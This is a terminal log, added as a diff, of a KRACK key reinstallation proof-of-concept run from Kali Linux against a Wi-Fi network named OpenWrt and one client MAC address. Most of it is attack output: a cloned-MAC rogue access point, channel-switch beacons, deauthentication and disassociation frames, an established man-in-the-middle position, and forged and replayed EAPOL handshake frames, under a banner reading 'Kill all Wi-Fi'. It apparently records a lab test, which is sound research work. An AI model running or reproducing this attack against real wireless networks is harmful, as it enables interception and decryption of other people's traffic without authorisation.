@@ -1,0 +1,445 @@
+┌──(kali㉿kali)-[~/krackattacks-poc-zerokey]
+└─$ sudo su
+[sudo] password for kali: 
+┌──(root㉿kali)-[/home/kali/krackattacks-poc-zerokey]
+└─# cd kkrackattack                         
+                                                                                                                                                                                                        
+┌──(root㉿kali)-[/home/kali/krackattacks-poc-zerokey/krackattack]
+└─# python ./krack.py wlan0 wlan1 OpenWrt -T 64:e5:99:f1:4d:d3 --debug -p dumptest --continuous-csa
+
+
+ █████   ████         █████   ███   █████ ███   Kill
+░░███   ███░         ░░███   ░███  ░░███ ░░░    all
+ ░███  ███     ██████ ░███   ░███   ░███ ████   Wi-Fi
+ ░███████     ░░░░░███░███   ░███   ░███░░███   :)
+ ░███░░███     ███████░░███  █████  ███  ░███ 
+ ░███ ░░███   ███░░███ ░░░█████░█████░   ░███ 
+ █████ ░░████░░████████  ░░███ ░░███     █████
+░░░░░   ░░░░  ░░░░░░░░    ░░░   ░░░     ░░░░░ 
+
+█ ▗ █ ▀ ▁▁ ▊▀▀ ▀    ▉▁▁█ ▗▛▚  ▟▔▀▬ ▉ ▟▛ ▀ ▉▙ █ ▟▔▀▬   ▝▀▜▀▘▟▔▔▚ ▟▔▔▚ ▊   ▜▁▔▀
+▜▄▀▄▘ ▊ ▔▔ █▔▔ ▊    █▔ ▊ █▔▔▊ ▜▄▃▞ █▔▚▃ ▊ █▝▚▊ ▜▄▞▜     █  ▜▄▃▞ ▜▄▃▞ █▃▄▖▅▁▔▟
+
+Based on: Key Reinstallation Attacks (KRACKs) by Mathy Vanhoef
+--------------------------------------------------------------
+
+[11:20:34] Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script
+[11:20:34] Note: keep >1 meter between both interfaces. Else packet delivery is unreliable & target may disconnect
+[11:20:37] Found new network: <OpenWrt[90:9f:33:f6:0a:88]> at channel 2 
+[11:20:37] Real channel now switched to 2
+[11:20:37] Successfully found the target network <OpenWrt>'s beacon frame!
+802.11 Management Beacon 90:9f:33:f6:0a:88 (TA=SA) > ff:ff:ff:ff:ff:ff (RA=DA) / Dot11Beacon / SSID='OpenWrt' / Dot11EltRates / Dot11EltDSSSet / Dot11Elt / Dot11EltERP / Dot11EltRSN / Dot11Elt / Dot11Elt / Dot11EltHTCapabilities / Dot11Elt / Dot11Elt / Dot11EltVendorSpecific
+           RogueAP is now in status 3
+[11:20:37] Target network OpenWrt detected on channel 2
+[11:20:37] Will create rogueAP on channel 11
+[11:20:37] Attaching filter to wlan0: <(wlan type data or wlan type mgt) and ((wlan addr1 90:9f:33:f6:0a:88) or (wlan addr2 90:9f:33:f6:0a:88) or (wlan addr1 64:e5:99:f1:4d:d3) or (wlan addr2 64:e5:99:f1:4d:d3))>
+[11:20:37] Attaching filter to wlan1mon: <(wlan type data or wlan type mgt) and ((wlan addr1 90:9f:33:f6:0a:88) or (wlan addr2 90:9f:33:f6:0a:88) or (wlan addr1 64:e5:99:f1:4d:d3) or (wlan addr2 64:e5:99:f1:4d:d3))>
+           RogueAP is now in status 4
+4
+[11:20:37] Setting MAC address of wlan1 to 90:9f:33:f6:0a:88
+wmm_enabled: 1
+ptksa_replay_counters:  3
+gtksa_replay_counters:  0
+Hostapd PID: 125536
+[11:20:38] Giving the rogue hostapd one second to initialize ...
+           RogueAP is now in status 5
+[11:20:39] wlan0: Injected frame Beacon(seq=3070, TSF=7025254178)
+[11:20:39] wlan0: Injected frame Beacon(seq=3070, TSF=7025254178)
+[11:20:39] wlan0: Injected frame Beacon(seq=3070, TSF=7025254178)
+[11:20:39] wlan0: Injected frame Beacon(seq=3070, TSF=7025254178)
+[11:20:39] wlan0: Injected frame Beacon(seq=3070, TSF=7025254178)
+[11:20:39] wlan0: Injected frame Beacon(seq=3070, TSF=7025254178)
+[11:20:39] wlan0: Injected frame Beacon(seq=3070, TSF=7025254178)
+[11:20:39] wlan0: Injected frame Beacon(seq=3070, TSF=7025254178)
+[11:20:39] Injected 4 CSA beacon pairs (moving stations to channel 11)
+[11:20:39] wlan0: Injected frame Deauth(seq=0, reason=STA_is_leaving)
+[11:20:39] wlan0: ignoring echoed frame
+[11:20:39] wlan0: ignoring echoed frame
+[11:20:39] wlan1mon: ignoring echoed frame
+[11:20:39] wlan1mon: Injected frame Disas(seq=0)
+[11:20:39] Rogue channel: injected Disassociation to 64:e5:99:f1:4d:d3
+[11:20:40] Rogue hostapd: nl80211: send_mlme - da= ff:ff:ff:ff:ff:ff noack=0 freq=0 no_cck=0 offchanok=0 wait_time=0 fc=0xc0 (WLAN_FC_STYPE_DEAUTH) nlmode=3
+[11:20:40] wlan1mon: ignoring echoed frame
+           Client 64:e5:99:f1:4d:d3 moved to state 2
+           Established MitM position against client 64:e5:99:f1:4d:d3 (moved to state 2)
+[11:20:42] wlan0: Injected frame Auth(seq=1712, status=0)
+[11:20:42] wlan1mon: Injected frame Auth(seq=1835, status=0)
+[11:20:42] wlan0: Injected frame AssoReq(seq=1713)
+[11:20:42] wlan0: Injected frame AssoReq(seq=1714)
+[11:20:42] wlan1mon: Injected frame AssoResp(seq=1836, status=0)
+[11:20:42] Storing msg1
+[11:20:42] wlan1mon: Injected frame EAPOL-Msg1(seq=0,replay=1)
+[11:20:42] wlan1mon: Injected frame AssoResp(seq=1837, status=0)
+[11:20:42] wlan1mon: ignoring echoed frame
+[11:20:42] Storing msg1
+[11:20:42] wlan1mon: Injected frame EAPOL-Msg1(seq=0,replay=2)
+[11:20:42] wlan1mon: ignoring echoed frame
+[11:20:42] wlan1mon: ignoring echoed frame
+[11:20:42] wlan1mon: ignoring echoed frame
+[11:20:42] Rogue hostapd: nl80211: sta_remove -> DEL_STATION wlan1 64:e5:99:f1:4d:d3 --> -2 (No such file or directory)
+[11:20:42] Rogue hostapd: nl80211: Add STA 64:e5:99:f1:4d:d3
+[11:20:42] Rogue hostapd: send_auth_reply: not sending own authentication reply
+[11:20:42] Rogue hostapd: send_assoc_resp: not sending association reply (status=0)
+[11:20:42] Rogue hostapd: __wpa_send_eapol: not sending EAPOL frame
+[11:20:42] Rogue hostapd: nl80211: sta_remove -> DEL_STATION wlan1 64:e5:99:f1:4d:d3 --> 0 (Success)
+[11:20:42] Rogue hostapd: nl80211: Add STA 64:e5:99:f1:4d:d3
+[11:20:42] Rogue hostapd: send_assoc_resp: not sending association reply (status=0)
+[11:20:42] Rogue hostapd: __wpa_send_eapol: not sending EAPOL frame
+[11:20:42] wlan0: Injected frame AssoReq(seq=1715)
+[11:20:42] wlan1mon: Injected frame AssoResp(seq=1838, status=0)
+[11:20:42] Storing msg1
+[11:20:42] wlan1mon: Injected frame EAPOL-Msg1(seq=0,replay=3)
+[11:20:42] wlan1mon: ignoring echoed frame
+[11:20:42] wlan0: Injected frame AssoReq(seq=1716)
+[11:20:42] wlan1mon: ignoring echoed frame
+[11:20:42] wlan1mon: Injected frame AssoResp(seq=1839, status=0)
+[11:20:42] Storing msg1
+[11:20:42] wlan1mon: Injected frame EAPOL-Msg1(seq=0,replay=4)
+[11:20:42] wlan1mon: ignoring echoed frame
+[11:20:42] wlan1mon: ignoring echoed frame
+[11:20:42] Rogue hostapd: nl80211: sta_remove -> DEL_STATION wlan1 64:e5:99:f1:4d:d3 --> 0 (Success)
+[11:20:42] Rogue hostapd: nl80211: Add STA 64:e5:99:f1:4d:d3
+[11:20:42] Rogue hostapd: send_assoc_resp: not sending association reply (status=0)
+[11:20:42] Rogue hostapd: __wpa_send_eapol: not sending EAPOL frame
+[11:20:42] wlan1mon: ignoring echoed frame
+[11:20:43] Storing msg1
+[11:20:43] wlan1mon: Injected frame EAPOL-Msg1(seq=1,replay=5)
+[11:20:43] wlan1mon: ignoring echoed frame
+[11:20:44] Storing msg1
+[11:20:44] wlan1mon: Injected frame EAPOL-Msg1(seq=2,replay=6)
+[11:20:44] wlan1mon: ignoring echoed frame
+[11:20:44] wlan0: Injected frame EAPOL-Msg2(seq=0,replay=5)
+           Initial msg3 with replay counter 7 found
+           Not forwarding EAPOL msg3 (1 unique now queued)
+[11:20:44] Rogue hostapd: nl80211: sta_remove -> DEL_STATION wlan1 64:e5:99:f1:4d:d3 --> 0 (Success)
+[11:20:44] Rogue hostapd: nl80211: Add STA 64:e5:99:f1:4d:d3
+[11:20:44] Rogue hostapd: send_assoc_resp: not sending association reply (status=0)
+[11:20:44] Rogue hostapd: __wpa_send_eapol: not sending EAPOL frame
+           Increased replay counter 8 found at new msg3!
+###[ 802.11 ]###
+  subtype   = QoS Data
+  type      = Data
+  proto     = 0
+  FCfield   = from-DS+MD
+  ID        = 51712
+  addr1     = 64:e5:99:f1:4d:d3 (RA=DA)
+  addr2     = 90:9f:33:f6:0a:88 (TA=BSSID)
+  addr3     = 90:9f:33:f6:0a:88 (SA)
+  SC        = 32
+###[ 802.11 QoS ]###
+     A_MSDU_Present= 0
+     Ack_Policy= 0
+     EOSP      = 0
+     TID       = 7
+     TXOP      = 0
+###[ LLC ]###
+        dsap      = 0xaa
+        ssap      = 0xaa
+        ctrl      = 3
+###[ SNAP ]###
+           OUI       = 00:00:00
+           code      = EAPOL
+###[ EAPOL ]###
+              version   = 802.1X-2004
+              type      = EAPOL-Key
+              len       = 95
+###[ EAPOL_KEY ]###
+                 key_descriptor_type= RSN
+                 res2      = 0
+                 smk_message= 0
+                 encrypted_key_data= 0
+                 request   = 0
+                 error     = 0
+                 secure    = 0
+                 has_key_mic= 0
+                 key_ack   = 1
+                 install   = 0
+                 res       = 0
+                 key_type  = Pairwise
+                 key_descriptor_type_version= HMAC-SHA1-128+AES-128
+                 key_length= 16
+                 key_replay_counter= 6
+                 key_nonce = 8b17fe168c52712e2cb594499e614e9ce12cfa7ffca35ab6452a52734ce7cf7e
+                 key_iv    = 00000000000000000000000000000000
+                 key_rsc   = 0000000000000000
+                 key_id    = 0000000000000000
+                 key_mic   = 00000000000000000000000000000000
+                 key_data_length= 0
+                 key_data  = 
+
+stored msg1: None
+           Got 2nd unique EAPOL msg3. Will forward both these Msg3's seperated by a forged msg1.
+           ==> Performing key reinstallation attack!
+###[ 802.11 ]###
+  subtype   = QoS Data
+  type      = Data
+  proto     = 0
+  FCfield   = from-DS+MD
+  ID        = 51712
+  addr1     = 64:e5:99:f1:4d:d3 (RA=DA)
+  addr2     = 90:9f:33:f6:0a:88 (TA=BSSID)
+  addr3     = 90:9f:33:f6:0a:88 (SA)
+  SC        = 32
+###[ 802.11 QoS ]###
+     A_MSDU_Present= 0
+     Ack_Policy= 0
+     EOSP      = 0
+     TID       = 7
+     TXOP      = 0
+###[ LLC ]###
+        dsap      = 0xaa
+        ssap      = 0xaa
+        ctrl      = 3
+###[ SNAP ]###
+           OUI       = 00:00:00
+           code      = EAPOL
+###[ EAPOL ]###
+              version   = 802.1X-2004
+              type      = EAPOL-Key
+              len       = 95
+###[ EAPOL_KEY ]###
+                 key_descriptor_type= RSN
+                 res2      = 0
+                 smk_message= 0
+                 encrypted_key_data= 0
+                 request   = 0
+                 error     = 0
+                 secure    = 0
+                 has_key_mic= 0
+                 key_ack   = 1
+                 install   = 0
+                 res       = 0
+                 key_type  = Pairwise
+                 key_descriptor_type_version= HMAC-SHA1-128+AES-128
+                 key_length= 16
+                 key_replay_counter= 6
+                 key_nonce = 8b17fe168c52712e2cb594499e614e9ce12cfa7ffca35ab6452a52734ce7cf7e
+                 key_iv    = 00000000000000000000000000000000
+                 key_rsc   = 0000000000000000
+                 key_id    = 0000000000000000
+                 key_mic   = 00000000000000000000000000000000
+                 key_data_length= 0
+                 key_data  = 
+
+msg1 BEFORE:  None
+###[ 802.11 ]###
+  subtype   = QoS Data
+  type      = Data
+  proto     = 0
+  FCfield   = from-DS+MD
+  ID        = 51712
+  addr1     = 64:e5:99:f1:4d:d3 (RA=DA)
+  addr2     = 90:9f:33:f6:0a:88 (TA=BSSID)
+  addr3     = 90:9f:33:f6:0a:88 (SA)
+  SC        = 32
+###[ 802.11 QoS ]###
+     A_MSDU_Present= 0
+     Ack_Policy= 0
+     EOSP      = 0
+     TID       = 7
+     TXOP      = 0
+###[ LLC ]###
+        dsap      = 0xaa
+        ssap      = 0xaa
+        ctrl      = 3
+###[ SNAP ]###
+           OUI       = 00:00:00
+           code      = EAPOL
+###[ EAPOL ]###
+              version   = 802.1X-2004
+              type      = EAPOL-Key
+              len       = 95
+###[ EAPOL_KEY ]###
+                 key_descriptor_type= RSN
+                 res2      = 0
+                 smk_message= 0
+                 encrypted_key_data= 0
+                 request   = 0
+                 error     = 0
+                 secure    = 0
+                 has_key_mic= 0
+                 key_ack   = 1
+                 install   = 0
+                 res       = 0
+                 key_type  = Pairwise
+                 key_descriptor_type_version= HMAC-SHA1-128+AES-128
+                 key_length= 16
+                 key_replay_counter= 8
+                 key_nonce = 8b17fe168c52712e2cb594499e614e9ce12cfa7ffca35ab6452a52734ce7cf7e
+                 key_iv    = 00000000000000000000000000000000
+                 key_rsc   = 0000000000000000
+                 key_id    = 0000000000000000
+                 key_mic   = 00000000000000000000000000000000
+                 key_data_length= 0
+                 key_data  = 
+
+msg1 AFTER:  None
+###[ 802.11 ]###
+  subtype   = QoS Data
+  type      = Data
+  proto     = 0
+  FCfield   = from-DS
+  ID        = 51712
+  addr1     = 64:e5:99:f1:4d:d3 (RA=DA)
+  addr2     = 90:9f:33:f6:0a:88 (TA=BSSID)
+  addr3     = 90:9f:33:f6:0a:88 (SA)
+  SC        = 48
+###[ 802.11 QoS ]###
+     A_MSDU_Present= 0
+     Ack_Policy= 0
+     EOSP      = 0
+     TID       = 7
+     TXOP      = 0
+###[ LLC ]###
+        dsap      = 0xaa
+        ssap      = 0xaa
+        ctrl      = 3
+###[ SNAP ]###
+           OUI       = 00:00:00
+           code      = EAPOL
+###[ EAPOL ]###
+              version   = 802.1X-2004
+              type      = EAPOL-Key
+              len       = 159
+###[ EAPOL_KEY ]###
+                 key_descriptor_type= RSN
+                 res2      = 0
+                 smk_message= 0
+                 encrypted_key_data= 1
+                 request   = 0
+                 error     = 0
+                 secure    = 1
+                 has_key_mic= 1
+                 key_ack   = 1
+                 install   = 1
+                 res       = 0
+                 key_type  = Pairwise
+                 key_descriptor_type_version= HMAC-SHA1-128+AES-128
+                 key_length= 16
+                 key_replay_counter= 7
+                 key_nonce = 8b17fe168c52712e2cb594499e614e9ce12cfa7ffca35ab6452a52734ce7cf7e
+                 key_iv    = 00000000000000000000000000000000
+                 key_rsc   = 0000000000000000
+                 key_id    = 0000000000000000
+                 key_mic   = 29b858fd834ea71004e39f338876594b
+                 key_data_length= 64
+                 key_data  = 4d53d0bab2ace1ef9ff120ea339eb703af835f4743f967317bcbc1977a8ef835b30f08ac54b54134f5c81a47d2a3c22a9305f4b8490029be95cb2358674ab8d8
+
+None
+[11:20:45] wlan1mon: Injected frame EAPOL-Msg3(seq=3,replay=7)
+###[ 802.11 ]###
+  subtype   = QoS Data
+  type      = Data
+  proto     = 0
+  FCfield   = from-DS+MD
+  ID        = 51712
+  addr1     = 64:e5:99:f1:4d:d3 (RA=DA)
+  addr2     = 90:9f:33:f6:0a:88 (TA=BSSID)
+  addr3     = 90:9f:33:f6:0a:88 (SA)
+  SC        = 32
+###[ 802.11 QoS ]###
+     A_MSDU_Present= 0
+     Ack_Policy= 0
+     EOSP      = 0
+     TID       = 7
+     TXOP      = 0
+###[ LLC ]###
+        dsap      = 0xaa
+        ssap      = 0xaa
+        ctrl      = 3
+###[ SNAP ]###
+           OUI       = 00:00:00
+           code      = EAPOL
+###[ EAPOL ]###
+              version   = 802.1X-2004
+              type      = EAPOL-Key
+              len       = 95
+###[ EAPOL_KEY ]###
+                 key_descriptor_type= RSN
+                 res2      = 0
+                 smk_message= 0
+                 encrypted_key_data= 0
+                 request   = 0
+                 error     = 0
+                 secure    = 0
+                 has_key_mic= 0
+                 key_ack   = 1
+                 install   = 0
+                 res       = 0
+                 key_type  = Pairwise
+                 key_descriptor_type_version= HMAC-SHA1-128+AES-128
+                 key_length= 16
+                 key_replay_counter= 8
+                 key_nonce = 8b17fe168c52712e2cb594499e614e9ce12cfa7ffca35ab6452a52734ce7cf7e
+                 key_iv    = 00000000000000000000000000000000
+                 key_rsc   = 0000000000000000
+                 key_id    = 0000000000000000
+                 key_mic   = 00000000000000000000000000000000
+                 key_data_length= 0
+                 key_data  = 
+
+None
+[11:20:45] wlan1mon: Injected frame EAPOL-Msg1(seq=2,replay=8)
+###[ 802.11 ]###
+  subtype   = QoS Data
+  type      = Data
+  proto     = 0
+  FCfield   = from-DS
+  ID        = 51712
+  addr1     = 64:e5:99:f1:4d:d3 (RA=DA)
+  addr2     = 90:9f:33:f6:0a:88 (TA=BSSID)
+  addr3     = 90:9f:33:f6:0a:88 (SA)
+  SC        = 64
+###[ 802.11 QoS ]###
+     A_MSDU_Present= 0
+     Ack_Policy= 0
+     EOSP      = 0
+     TID       = 7
+     TXOP      = 0
+###[ LLC ]###
+        dsap      = 0xaa
+        ssap      = 0xaa
+        ctrl      = 3
+###[ SNAP ]###
+           OUI       = 00:00:00
+           code      = EAPOL
+###[ EAPOL ]###
+              version   = 802.1X-2004
+              type      = EAPOL-Key
+              len       = 159
+###[ EAPOL_KEY ]###
+                 key_descriptor_type= RSN
+                 res2      = 0
+                 smk_message= 0
+                 encrypted_key_data= 1
+                 request   = 0
+                 error     = 0
+                 secure    = 1
+                 has_key_mic= 1
+                 key_ack   = 1
+                 install   = 1
+                 res       = 0
+                 key_type  = Pairwise
+                 key_descriptor_type_version= HMAC-SHA1-128+AES-128
+                 key_length= 16
+                 key_replay_counter= 8
+                 key_nonce = 8b17fe168c52712e2cb594499e614e9ce12cfa7ffca35ab6452a52734ce7cf7e
+                 key_iv    = 00000000000000000000000000000000
+                 key_rsc   = 0000000000000000
+                 key_id    = 0000000000000000
+                 key_mic   = b5deb697c4b7570b20caaeeb63ff56a4
+                 key_data_length= 64
+                 key_data  = 4d53d0bab2ace1ef9ff120ea339eb703af835f4743f967317bcbc1977a8ef835b30f08ac54b54134f5c81a47d2a3c22a9305f4b8490029be95cb2358674ab8d8
+
+None
+[11:20:45] wlan1mon: Injected frame EAPOL-Msg3(seq=4,replay=8)
+           Client 64:e5:99:f1:4d:d3 moved to state 3
+[11:20:45] wlan1mon: ignoring echoed frame
+[11:20:45] wlan1mon: ignoring echoed frame
+[11:20:45] wlan1mon: ignoring echoed frame
+[11:20:45] Rogue hostapd: wpa_receive: Igning all EAPOL frames
+[11:20:46] wlan1mon: Injected frame EAPOL-Msg3(seq=5,replay=9)
+[11:20:46] wlan1mon: ignoring echoed frame
+[11:20:46] Rogue hostapd: wpa_receive: Igning all EAPOL frames
+[11:20:47] wlan1mon: Injected frame EAPOL-Msg3(seq=6,replay=10)
+[11:20:47] wlan1mon: ignoring echoed frame
